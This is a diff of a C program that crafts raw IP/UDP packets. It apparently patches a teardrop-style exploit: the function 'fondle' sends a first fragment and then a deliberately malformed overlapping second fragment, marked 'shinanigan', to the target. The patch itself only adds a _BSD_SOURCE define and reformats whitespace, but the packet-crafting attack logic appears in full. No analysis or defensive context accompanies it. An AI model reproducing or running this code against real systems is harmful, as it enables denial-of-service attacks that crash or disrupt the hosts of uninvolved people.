@@ -1,3 +1,5 @@
+#define _BSD_SOURCE
+
 #include <stdio.h>
 #include <string.h>
 
@@ -21,10 +23,10 @@ struct udp_pkt
         char data[PADDING];
 } pkt;
 
-int     udplen=sizeof(struct udphdr),
-        iplen=sizeof(struct iphdr),
-        datalen=100,
-        psize=sizeof(struct udphdr)+sizeof(struct iphdr)+PADDING,
+int     udplen = sizeof(struct udphdr),
+        iplen = sizeof(struct iphdr),
+        datalen = 100,
+        psize = sizeof(struct udphdr) + sizeof(struct iphdr) + PADDING, 
         spf_sck;                        /* Socket */
 
 void usage(void)
@@ -52,42 +54,39 @@ void quit(char *reason)
         exit(-1);
 }
 
-int fondle(int sck, u_long src_addr, u_long dst_addr, int src_prt,
-           int dst_prt)
+int fondle(int sck, u_long src_addr, u_long dst_addr, int src_prt, int dst_prt)
 {
         int     bs;
         struct  sockaddr_in to;
 
-        memset(&pkt, 0, psize);
+        memset( &pkt, 0, psize );
                                                 /* Fill in ip header */
         pkt.ip.version = 4;
         pkt.ip.ihl = 5;
-        pkt.ip.tot_len = htons(udplen + iplen + PADDING);
-        pkt.ip.id = htons(0x455);
+        pkt.ip.tot_len = htons( udplen + iplen + PADDING );
+        pkt.ip.id = htons( 0x455 );
         pkt.ip.ttl = 255;
         pkt.ip.protocol = IPPROTO_UDP;
         pkt.ip.saddr = src_addr;
         pkt.ip.daddr = dst_addr;
-        pkt.ip.frag_off = htons(0x2000);        /* more to come */
+        pkt.ip.frag_off = htons( 0x2000 );        /* more to come */
 
-        pkt.udp.source = htons(src_prt);        /* udp header */
-        pkt.udp.dest = htons(dst_prt);
-        pkt.udp.len = htons(8 + PADDING);
+        pkt.udp.source = htons( src_prt );        /* udp header */
+        pkt.udp.dest = htons( dst_prt );
+        pkt.udp.len = htons( 8 + PADDING );
                                                 /* send 1st frag */
 
         to.sin_family = AF_INET;
         to.sin_port = src_prt;
         to.sin_addr.s_addr = dst_addr;
 
-        bs = sendto(sck, &pkt, psize, 0, (struct sockaddr *) &to,
-                sizeof(struct sockaddr));
+        bs = sendto(sck, &pkt, psize, 0, (struct sockaddr *) &to, sizeof(struct sockaddr) );
 
         pkt.ip.frag_off = htons(FRG_CONST + 1);         /* shinanigan */
         pkt.ip.tot_len = htons(iplen + FRG_CONST);
                                                         /* 2nd frag */
 
-        bs = sendto(sck, &pkt, iplen + FRG_CONST + 1, 0,
-                (struct sockaddr *) &to, sizeof(struct sockaddr));
+        bs = sendto(sck, &pkt, iplen + FRG_CONST + 1, 0, (struct sockaddr *) &to, sizeof(struct sockaddr) );
 
         return bs;
 }
